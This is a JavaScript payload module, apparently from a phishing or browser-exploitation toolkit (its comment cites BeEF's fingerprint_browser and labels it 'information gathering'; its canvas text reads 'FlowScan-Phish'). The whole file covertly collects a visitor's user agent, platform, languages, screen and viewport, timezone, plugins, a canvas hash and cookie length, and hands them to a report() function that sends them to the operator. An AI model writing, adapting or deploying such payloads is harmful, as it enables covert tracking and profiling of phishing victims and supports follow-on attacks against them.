// MODULE = {"desc": "浏览器指纹增强:平台/语言/屏幕/时区/插件/Canvas hash(BeEF fingerprint_browser)", "category": "信息收集", "params": []}
(function () {
  function canvasHash() {
    try {
      var c = document.createElement('canvas');
      c.width = 200; c.height = 60;
      var ctx = c.getContext('2d');
      if (!ctx) { return ''; }
      ctx.textBaseline = 'top'; ctx.font = '14px Arial';
      ctx.fillStyle = '#f60'; ctx.fillRect(10, 10, 60, 30);
      ctx.fillStyle = '#069'; ctx.font = '16px Arial';
      ctx.fillText('FlowScan-Phish', 12, 12);
      var d = c.toDataURL();
      return d.length + ':' + d.slice(-32);
    } catch (e) { return ''; }
  }
  var d = {
    type: "fingerprint", url: location.href,
    ua: navigator.userAgent,
    platform: navigator.platform || '',
    language: navigator.language || '',
    languages: (navigator.languages || []).join(','),
    screen: (screen.width || 0) + 'x' + (screen.height || 0) + 'x' + (screen.colorDepth || 0),
    viewport: (window.innerWidth || 0) + 'x' + (window.innerHeight || 0),
    tz: new Date().getTimezoneOffset(),
    tzname: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) { return ''; } })(),
    plugins: (function () {
      try {
        var p = navigator.plugins, a = [];
        for (var i = 0; i < p.length && i < 10; i++) { a.push(p[i].name.split(' ')[0]); }
        return a.join(',');
      } catch (e) { return ''; }
    })(),
    canvas: canvasHash(),
    cookie_len: document.cookie ? document.cookie.length : 0
  };
  report(d);
})();
